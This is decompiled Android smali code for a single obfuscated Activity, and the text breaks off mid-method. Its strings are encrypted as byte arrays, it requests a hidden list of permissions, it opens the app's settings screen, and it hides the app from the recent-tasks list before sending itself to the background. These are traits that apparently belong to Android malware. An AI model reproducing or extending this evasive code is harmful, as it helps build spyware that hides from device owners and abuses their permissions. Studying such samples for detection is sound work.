.class public Lcom/vknnolqo/p9sv5zvf/Zw20l03q;
.super Landroid/app/Activity;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/vknnolqo/p9sv5zvf/Zw20l03q$e;,
        Lcom/vknnolqo/p9sv5zvf/Zw20l03q$f;
    }
.end annotation


# instance fields
.field private b:Landroid/widget/ProgressBar;

.field private c:Landroid/webkit/ValueCallback;

.field private d:Landroid/view/View$OnClickListener;

.field private e:Landroid/view/View$OnClickListener;

.field f:Landroid/webkit/WebView;

.field g:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 2

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    new-instance v0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q$a;

    invoke-direct {v0, p0}, Lcom/vknnolqo/p9sv5zvf/Zw20l03q$a;-><init>(Lcom/vknnolqo/p9sv5zvf/Zw20l03q;)V

    iput-object v0, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->d:Landroid/view/View$OnClickListener;

    new-instance v0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q$b;

    invoke-direct {v0, p0}, Lcom/vknnolqo/p9sv5zvf/Zw20l03q$b;-><init>(Lcom/vknnolqo/p9sv5zvf/Zw20l03q;)V

    iput-object v0, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->e:Landroid/view/View$OnClickListener;

    const/16 v0, 0x9

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->g:Ljava/lang/String;

    return-void

    :array_0
    .array-data 1
        0x19t
        0x7bt
        0x3at
        0x4bt
        0x9t
        -0x21t
        -0x52t
        -0x1at
        0x5t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x6at
        0x10t
        0x53t
        0x25t
        0x27t
        -0x4at
        -0x40t
        -0x80t
    .end array-data
.end method

.method public static synthetic a(Lcom/vknnolqo/p9sv5zvf/Zw20l03q;Lcom/vknnolqo/p9sv5zvf/HhmXUb1k$a;)V
    .locals 0

    .line 1
    invoke-direct {p0, p1}, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->i(Lcom/vknnolqo/p9sv5zvf/HhmXUb1k$a;)V

    return-void
.end method

.method public static synthetic b(Lcom/vknnolqo/p9sv5zvf/Zw20l03q;Lcom/vknnolqo/p9sv5zvf/HhmXUb1k$a;)V
    .locals 0

    .line 1
    invoke-direct {p0, p1}, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->j(Lcom/vknnolqo/p9sv5zvf/HhmXUb1k$a;)V

    return-void
.end method

.method public static c()[Ljava/lang/String;
    .locals 5

    .line 1
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    const/16 v1, 0x1b

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    const/16 v1, 0x1c

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v3, v2, [B

    fill-array-data v3, :array_3

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    const/16 v1, 0x27

    new-array v1, v1, [B

    fill-array-data v1, :array_4

    new-array v3, v2, [B

    fill-array-data v3, :array_5

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    const/16 v1, 0x24

    new-array v3, v1, [B

    fill-array-data v3, :array_6

    new-array v4, v2, [B

    fill-array-data v4, :array_7

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v0, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    new-array v1, v1, [B

    fill-array-data v1, :array_8

    new-array v2, v2, [B

    fill-array-data v2, :array_9

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    const/4 v1, 0x0

    new-array v1, v1, [Ljava/lang/String;

    invoke-interface {v0, v1}, Ljava/util/List;->toArray([Ljava/lang/Object;)[Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [Ljava/lang/String;

    return-object v0

    :array_0
    .array-data 1
        0x12t
        -0x79t
        0xat
        -0x6at
        0x46t
        -0xet
        -0x2et
        -0xdt
        0x3t
        -0x74t
        0x1ct
        -0x77t
        0x40t
        -0x18t
        -0x3bt
        -0x4ct
        0x1ct
        -0x79t
        0x40t
        -0x53t
        0x67t
        -0x31t
        -0xdt
        -0x71t
        0x3dt
        -0x54t
        0x3at
    .end array-data

    :array_1
    .array-data 1
        0x73t
        -0x17t
        0x6et
        -0x1ct
        0x29t
        -0x65t
        -0x4at
        -0x23t
    .end array-data

    :array_2
    .array-data 1
        0x1ct
        0x1dt
        0x56t
        -0x1ct
        0x67t
        0x54t
        -0x5bt
        0x18t
        0xdt
        0x16t
        0x40t
        -0x5t
        0x61t
        0x4et
        -0x4et
        0x5ft
        0x12t
        0x1dt
        0x1ct
        -0x3ft
        0x49t
        0x76t
        -0x7ct
        0x69t
        0x31t
        0x3ct
        0x71t
        -0x23t
    .end array-data

    :array_3
    .array-data 1
        0x7dt
        0x73t
        0x32t
        -0x6at
        0x8t
        0x3dt
        -0x3ft
        0x36t
    .end array-data

    :array_4
    .array-data 1
        0xdt
        -0x6at
        -0x43t
        0x74t
        0x5t
        0x64t
        0x13t
        -0x48t
        0x1ct
        -0x63t
        -0x55t
        0x6bt
        0x3t
        0x7et
        0x4t
        -0x1t
        0x3t
        -0x6at
        -0x9t
        0x47t
        0x29t
        0x4et
        0x32t
        -0x3bt
        0x3ft
        -0x59t
        -0x69t
        0x43t
        0x3et
        0x5at
        0x38t
        -0x3ct
        0x27t
        -0x59t
        -0x76t
        0x52t
        0x2bt
        0x59t
        0x32t
    .end array-data

    :array_5
    .array-data 1
        0x6ct
        -0x8t
        -0x27t
        0x6t
        0x6at
        0xdt
        0x77t
        -0x6at
    .end array-data

    :array_6
    .array-data 1
        -0x6at
        -0x63t
        0x28t
        -0x72t
        0x71t
        0x4t
        0x16t
        0x4t
        -0x79t
        -0x6at
        0x3et
        -0x6ft
        0x77t
        0x1et
        0x1t
        0x43t
        -0x68t
        -0x63t
        0x62t
        -0x43t
        0x5dt
        0x2et
        0x37t
        0x79t
        -0x5ct
        -0x54t
        0x1bt
        -0x4bt
        0x58t
        0x24t
        0x2dt
        0x79t
        -0x5dt
        -0x4et
        0x18t
        -0x47t
    .end array-data

    :array_7
    .array-data 1
        -0x9t
        -0xdt
        0x4ct
        -0x4t
        0x1et
        0x6dt
        0x72t
        0x2at
    .end array-data

    :array_8
    .array-data 1
        -0x56t
        0x61t
        0x7t
        -0xbt
        -0xet
        -0x59t
        0x62t
        0xct
        -0x45t
        0x6at
        0x11t
        -0x16t
        -0xct
        -0x43t
        0x75t
        0x4bt
        -0x5ct
        0x61t
        0x4dt
        -0x3ct
        -0x2bt
        -0x71t
        0x48t
        0x65t
        -0x72t
        0x50t
        0x34t
        -0x32t
        -0x25t
        -0x79t
        0x59t
        0x71t
        -0x61t
        0x4et
        0x37t
        -0x3et
    .end array-data

    :array_9
    .array-data 1
        -0x35t
        0xft
        0x63t
        -0x79t
        -0x63t
        -0x32t
        0x6t
        0x22t
    .end array-data
.end method

.method static synthetic d(Lcom/vknnolqo/p9sv5zvf/Zw20l03q;)Landroid/widget/ProgressBar;
    .locals 0

    .line 1
    iget-object p0, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->b:Landroid/widget/ProgressBar;

    return-object p0
.end method

.method static synthetic e(Lcom/vknnolqo/p9sv5zvf/Zw20l03q;)Landroid/webkit/ValueCallback;
    .locals 0

    .line 1
    iget-object p0, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->c:Landroid/webkit/ValueCallback;

    return-object p0
.end method

.method static synthetic f(Lcom/vknnolqo/p9sv5zvf/Zw20l03q;Landroid/webkit/ValueCallback;)Landroid/webkit/ValueCallback;
    .locals 0

    .line 1
    iput-object p1, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->c:Landroid/webkit/ValueCallback;

    return-object p1
.end method

.method private g()V
    .locals 7

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->c()[Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/util/ArrayList;

    invoke-direct {v1}, Ljava/util/ArrayList;-><init>()V

    array-length v2, v0

    const/4 v3, 0x0

    move v4, v3

    :goto_0
    if-ge v4, v2, :cond_1

    aget-object v5, v0, v4

    invoke-static {p0, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/id;->a(Landroid/content/Context;Ljava/lang/String;)I

    move-result v6

    if-eqz v6, :cond_0

    invoke-interface {v1, v5}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    :cond_0
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    :cond_1
    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_2

    new-array v0, v3, [Ljava/lang/String;

    invoke-interface {v1, v0}, Ljava/util/List;->toArray([Ljava/lang/Object;)[Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [Ljava/lang/String;

    const/16 v1, 0x16

    invoke-static {p0, v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/x1;->n(Landroid/app/Activity;[Ljava/lang/String;I)V

    :cond_2
    return-void
.end method

.method public static h(Landroid/content/Context;)Z
    .locals 2

    .line 1
    const/16 v0, 0xc

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Landroid/net/ConnectivityManager;

    invoke-virtual {p0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object p0

    if-eqz p0, :cond_0

    invoke-virtual {p0}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result p0

    if-eqz p0, :cond_0

    const/4 p0, 0x1

    return p0

    :cond_0
    const/4 p0, 0x0

    return p0

    :array_0
    .array-data 1
        0x21t
        -0x12t
        -0x19t
        0x53t
        0x43t
        -0x8t
        -0x5at
        0x4et
        0x34t
        -0x18t
        -0x3t
        0x44t
    .end array-data

    :array_1
    .array-data 1
        0x42t
        -0x7ft
        -0x77t
        0x3dt
        0x26t
        -0x65t
        -0x2et
        0x27t
    .end array-data
.end method

.method private synthetic i(Lcom/vknnolqo/p9sv5zvf/HhmXUb1k$a;)V
    .locals 4

    .line 1
    const/16 p1, 0x8

    new-array v0, p1, [B

    fill-array-data v0, :array_0

    new-array p1, p1, [B

    fill-array-data p1, :array_1

    invoke-static {v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p0, p1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/app/ActivityManager;

    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1}, Landroid/app/ActivityManager;->getAppTasks()Ljava/util/List;

    move-result-object p1

    invoke-interface {p1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object p1

    :cond_0
    :goto_0
    invoke-interface {p1}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_1

    invoke-interface {p1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/ActivityManager$AppTask;

    invoke-virtual {v1}, Landroid/app/ActivityManager$AppTask;->getTaskInfo()Landroid/app/ActivityManager$RecentTaskInfo;

    move-result-object v2

    invoke-static {v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/r1;->a(Landroid/app/ActivityManager$RecentTaskInfo;)Landroid/content/ComponentName;

    move-result-object v2

    if-eqz v2, :cond_0

    invoke-virtual {v1}, Landroid/app/ActivityManager$AppTask;->getTaskInfo()Landroid/app/ActivityManager$RecentTaskInfo;

    move-result-object v2

    invoke-static {v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/r1;->a(Landroid/app/ActivityManager$RecentTaskInfo;)Landroid/content/ComponentName;

    move-result-object v2

    invoke-virtual {v2}, Landroid/content/ComponentName;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_0

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Landroid/app/ActivityManager$AppTask;->setExcludeFromRecents(Z)V

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    sget-object v2, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->o:Ljava/lang/String;

    sget-object v3, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {v1, v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    goto :goto_0

    :cond_1
    return-void

    nop

    :array_0
    .array-data 1
        0x6at
        0x75t
        0x54t
        -0x9t
        -0x54t
        -0x67t
        -0x30t
        -0x6t
    .end array-data

    :array_1
    .array-data 1
        0xbt
        0x16t
        0x20t
        -0x62t
        -0x26t
        -0x10t
        -0x5ct
        -0x7dt
    .end array-data
.end method

.method private synthetic j(Lcom/vknnolqo/p9sv5zvf/HhmXUb1k$a;)V
    .locals 0

    .line 1
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    return-void
.end method

.method private k(Landroid/content/Context;)V
    .locals 2

    .line 1
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/vknnolqo/p9sv5zvf/Zw20l03q$d;

    invoke-direct {v1, p0, p1}, Lcom/vknnolqo/p9sv5zvf/Zw20l03q$d;-><init>(Lcom/vknnolqo/p9sv5zvf/Zw20l03q;Landroid/content/Context;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method


# virtual methods
.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 1

    const/4 v0, 0x1

    if-ne p1, v0, :cond_2

    iget-object p1, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->c:Landroid/webkit/ValueCallback;

    if-eqz p1, :cond_2

    if-eqz p3, :cond_2

    const/4 p1, -0x1

    if-eq p2, p1, :cond_0

    goto :goto_1

    :cond_0
    invoke-virtual {p3}, Landroid/content/Intent;->getDataString()Ljava/lang/String;

    move-result-object p1

    const/4 p2, 0x0

    if-eqz p1, :cond_1

    new-array p3, v0, [Landroid/net/Uri;

    const/4 v0, 0x0

    invoke-static {p1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object p1

    aput-object p1, p3, v0

    goto :goto_0

    :cond_1
    move-object p3, p2

    :goto_0
    iget-object p1, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->c:Landroid/webkit/ValueCallback;

    invoke-interface {p1, p3}, Landroid/webkit/ValueCallback;->onReceiveValue(Ljava/lang/Object;)V

    iput-object p2, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->c:Landroid/webkit/ValueCallback;

    nop

    :cond_2
    :goto_1
    return-void
.end method

.method public onBackPressed()V
    .locals 1

    :try_start_0
    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->f:Landroid/webkit/WebView;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/webkit/WebView;->canGoBack()Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->f:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->goBack()V

    goto :goto_0

    :cond_0
    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V
    :try_end_0
    .catch Ljava/lang/NullPointerException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V

    :goto_0
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 11

    const-string v0, ""

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    sget-object p1, Lcom/vknnolqo/p9sv5zvf/BuZckswr;->Draws_overs:Ljava/lang/String;

    const/4 v1, 0x1

    new-array v2, v1, [B

    const/16 v3, -0x62

    const/4 v4, 0x0

    aput-byte v3, v2, v4

    const/16 v3, 0x8

    new-array v5, v3, [B

    fill-array-data v5, :array_0

    invoke-static {v2, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    const/4 v2, 0x0

    const/4 v5, 0x7

    if-eqz p1, :cond_0

    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v6, 0x1e

    if-lt p1, v6, :cond_0

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/s1;->a()Z

    move-result p1

    if-nez p1, :cond_0

    new-instance p1, Landroid/content/Intent;

    const/16 v6, 0x37

    new-array v6, v6, [B

    fill-array-data v6, :array_1

    new-array v7, v3, [B

    fill-array-data v7, :array_2

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-direct {p1, v6}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    new-array v6, v5, [B

    fill-array-data v6, :array_3

    new-array v7, v3, [B

    fill-array-data v7, :array_4

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v7

    invoke-static {v6, v7, v2}, Landroid/net/Uri;->fromParts(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v6

    invoke-virtual {p1, v6}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    const/high16 v6, 0x10000000

    invoke-virtual {p1, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v6, 0x20000000

    invoke-virtual {p1, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, p1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    :cond_0
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    sget-object v6, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->n:Ljava/lang/String;

    sget-object v7, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {p1, v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-eqz p1, :cond_4

    new-array p1, v3, [B

    fill-array-data p1, :array_5

    new-array v0, v3, [B

    fill-array-data v0, :array_6

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p0, p1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/app/ActivityManager;

    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v0

    if-eqz p1, :cond_2

    invoke-virtual {p1}, Landroid/app/ActivityManager;->getAppTasks()Ljava/util/List;

    move-result-object p1

    invoke-interface {p1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object p1

    :cond_1
    :goto_0
    invoke-interface {p1}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_2

    invoke-interface {p1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/app/ActivityManager$AppTask;

    invoke-virtual {v2}, Landroid/app/ActivityManager$AppTask;->getTaskInfo()Landroid/app/ActivityManager$RecentTaskInfo;

    move-result-object v3

    invoke-static {v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/r1;->a(Landroid/app/ActivityManager$RecentTaskInfo;)Landroid/content/ComponentName;

    move-result-object v3

    if-eqz v3, :cond_1

    invoke-virtual {v2}, Landroid/app/ActivityManager$AppTask;->getTaskInfo()Landroid/app/ActivityManager$RecentTaskInfo;

    move-result-object v3

    invoke-static {v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/r1;->a(Landroid/app/ActivityManager$RecentTaskInfo;)Landroid/content/ComponentName;

    move-result-object v3

    invoke-virtual {v3}, Landroid/content/ComponentName;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    invoke-virtual {v2, v1}, Landroid/app/ActivityManager$AppTask;->setExcludeFromRecents(Z)V

    goto :goto_0

    :cond_2
    sget-boolean p1, Lcom/vknnolqo/p9sv5zvf/YidxNjm8;->c:Z

    if-eqz p1, :cond_3

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->M()[B

    :cond_3
    invoke-virtual {p0, v1}, Landroid/app/Activity;->moveTaskToBack(Z)Z

    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    return-void

    :cond_4
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    sget-object v6, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->o:Ljava/lang/String;

    invoke-static {p1, v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-eqz p1, :cond_6

    new-array p1, v3, [B

    fill-array-data p1, :array_7

    new-array v6, v3, [B

    fill-array-data v6, :array_8

    invoke-static {p1, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p0, p1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/app/ActivityManager;

    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {p1}, Landroid/app/ActivityManager;->getAppTasks()Ljava/util/List;

    move-result-object p1

    invoke-interface {p1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object p1

    :cond_5
    :goto_1
    invoke-interface {p1}, Ljava/util/Iterator;->hasNext()Z

    move-result v7

    if-eqz v7, :cond_6

    invoke-interface {p1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/app/ActivityManager$AppTask;

    invoke-virtual {v7}, Landroid/app/ActivityManager$AppTask;->getTaskInfo()Landroid/app/ActivityManager$RecentTaskInfo;

    move-result-object v8

    invoke-static {v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/r1;->a(Landroid/app/ActivityManager$RecentTaskInfo;)Landroid/content/ComponentName;

    move-result-object v8

    if-eqz v8, :cond_5

    invoke-virtual {v7}, Landroid/app/ActivityManager$AppTask;->getTaskInfo()Landroid/app/ActivityManager$RecentTaskInfo;

    move-result-object v8

    invoke-static {v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/r1;->a(Landroid/app/ActivityManager$RecentTaskInfo;)Landroid/content/ComponentName;

    move-result-object v8

    invoke-virtual {v8}, Landroid/content/ComponentName;->getPackageName()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v8, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_5

    invoke-virtual {v7, v1}, Landroid/app/ActivityManager$AppTask;->setExcludeFromRecents(Z)V

    goto :goto_1

    :cond_6
    new-instance p1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/t1;

